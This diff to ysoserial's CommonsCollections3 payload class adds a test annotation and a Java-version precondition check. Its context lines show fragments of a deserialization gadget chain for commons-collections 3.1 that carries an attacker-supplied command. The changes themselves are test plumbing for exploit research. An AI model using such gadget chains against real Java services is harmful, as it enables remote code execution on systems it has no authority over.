@@ -15,9 +15,11 @@ import org.apache.commons.collections.map.LazyMap;
 import ysoserial.annotation.Bind;
 import ysoserial.interfaces.ObjectPayload;
 import ysoserial.payloads.annotation.Dependencies;
+import ysoserial.payloads.annotation.PayloadTest;
 import ysoserial.payloads.util.Gadgets;
 import ysoserial.payloads.util.PayloadRunner;
 import ysoserial.payloads.util.Reflections;
+import ysoserial.payloads.util.Version;
 
 import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
 
@@ -27,6 +29,7 @@ import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
  */
 @SuppressWarnings({"rawtypes", "unchecked", "restriction"})
 @Dependencies({"commons-collections:commons-collections:3.1"})
+@PayloadTest( precondition = "testCheckJavaVersion" )
 public class CommonsCollections3 extends PayloadRunner implements ObjectPayload<Object> {
 
 	@Bind private String command;
@@ -62,6 +65,10 @@ public class CommonsCollections3 extends PayloadRunner implements ObjectPayload<
 		Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain
 
 		return handler;
+	}
+	
+	public static Boolean testCheckJavaVersion() { 
+		return Version.allowsDefaultAIH();
 	}
 
 	public static void main(final String[] args) throws Exception {
